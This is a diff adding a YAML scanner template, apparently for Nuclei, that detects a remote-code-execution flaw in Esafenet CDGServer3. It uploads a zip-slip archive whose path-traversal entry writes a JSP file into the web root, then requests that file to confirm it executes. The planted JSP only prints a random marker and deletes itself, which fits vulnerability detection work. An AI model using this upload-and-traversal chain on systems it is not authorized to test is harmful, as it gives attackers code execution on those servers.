@@ -1,0 +1,44 @@
+id: esafenet-cdg-rce-CT-1056284
+
+info:
+  name: Esafenet CDGServer3 RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a file upload vulnerability in CDGServer3 to achieve remote code execution by leveraging a zip-slip attack.
+
+variables:
+  randomFileName: "{{to_lower(rand_base(8))}}"
+  randomContent: "{{to_lower(rand_base(8))}}"
+  rboundary: "{{to_lower(rand_base(8))}}"
+  fname: "../../../js/{{randomFileName}}.jsp"
+  filecontent: "<% out.print(\"{{randomContent}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"
+  payload: "{{zip('fname', 'filecontent')}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/hiddenWatermark/uploadFile"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="doc"; filename="{{randomFileName}}.zip"\r\nContent-Type: application/zip\r\n\r\n{{payload}}\r\n------WebKitFormBoundary{{rboundary}}--\r\n
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: validate-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/CDGServer3/js/{{randomFileName}}.jsp"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randomContent}}"
+        part: body
+    matchers-condition: and
